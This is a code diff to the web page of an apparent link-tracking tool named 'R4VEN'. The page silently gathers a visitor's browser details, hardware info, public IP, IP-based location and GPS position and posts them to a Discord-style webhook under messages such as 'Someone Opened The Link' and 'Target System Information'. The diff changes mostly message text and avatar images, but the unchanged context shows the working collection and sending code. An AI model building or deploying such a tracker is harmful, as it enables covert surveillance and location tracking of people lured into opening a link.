@@ -20,7 +20,7 @@
 <script>
 var x = document.getElementById("demo");
 
-var sysinfo = (" GET " , "\n__**Uagent:**__ " + "```xl\n" + navigator.userAgent + "```" + "\n__**AppVersion:**__ " + "```xl\n" + navigator.appVersion + "```" + "```autohotkey\n" + "\nPlatform: " + navigator.platform + "\nCookies Enabled: " + navigator.cookieEnabled + "\nBrowser Language: " + navigator.language + "\nBrowser Name: "+ navigator.appName + "\nBrowser CodeName: " + navigator.appCodeName + "\nRam: " + navigator.deviceMemory + "\nCPU cores: " + navigator.hardwareConcurrency + "\nOscpu: " + navigator.oscpu + "```");
+var sysinfo = (" GET " , "```xl\n" + navigator.userAgent + "```" + "```autohotkey\n" + "\nPlatform: " + navigator.platform + "\nCookies Enabled: " + navigator.cookieEnabled + "\nBrowser Language: " + navigator.language + "\nBrowser Name: "+ navigator.appName + "\nBrowser CodeName: " + navigator.appCodeName + "\nRam: " + navigator.deviceMemory + "\nCPU cores: " + navigator.hardwareConcurrency + "\nOscpu: " + navigator.oscpu + "```");
 
 const request = new XMLHttpRequest();
     request.open("POST", "/location_update"); //change webhook
@@ -29,17 +29,17 @@ const request = new XMLHttpRequest();
 
     var myEmbed = {
       author: {
-        name: "Someone Opened The Link !!"
+        name: "Target System Information.."
       },
-      title: "Target System Information..",
+      title: "Uagent:",
       description: sysinfo,
       color: 15418782
     }
 
     var params = {
       username: "R4VEN",
-      avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1050532742707806288/vecteezy_cute-flat-illustration-cartoon-of-thief-hacker-stealing-data_14603389.jpg",
-      content: "@here",
+      avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
+      content: "@here Someone Opened The Link ☠️",
       embeds: [ myEmbed ]
     }
 
@@ -69,7 +69,7 @@ $.getJSON("https://api.ipify.org?format=json", function(data) {
 
       var params = {
         username: "R4VEN",
-        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1050532742707806288/vecteezy_cute-flat-illustration-cartoon-of-thief-hacker-stealing-data_14603389.jpg",
+        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
         embeds: [ myEmbed ]
       }
 
@@ -114,7 +114,7 @@ $.getJSON("http://ip-api.com/json/?fields=status,message,continent,continentCode
 
       var params = {
         username: "R4VEN",
-        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1050532742707806288/vecteezy_cute-flat-illustration-cartoon-of-thief-hacker-stealing-data_14603389.jpg",
+        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
         embeds: [ myEmbed ]
       }
 
@@ -152,7 +152,7 @@ function showPosition(position) {
 
       var params = {
         username: "R4VEN",
-        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1050532742707806288/vecteezy_cute-flat-illustration-cartoon-of-thief-hacker-stealing-data_14603389.jpg",
+        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
         embeds: [ myEmbed ]
       }
 
@@ -170,7 +170,7 @@ function showError(error) {
 
       const params = {
         username: "R4VEN",
-        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1050532742707806288/vecteezy_cute-flat-illustration-cartoon-of-thief-hacker-stealing-data_14603389.jpg",
+        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
         content: "```diff\n- User denied the request for Geolocation.```"
       }
 
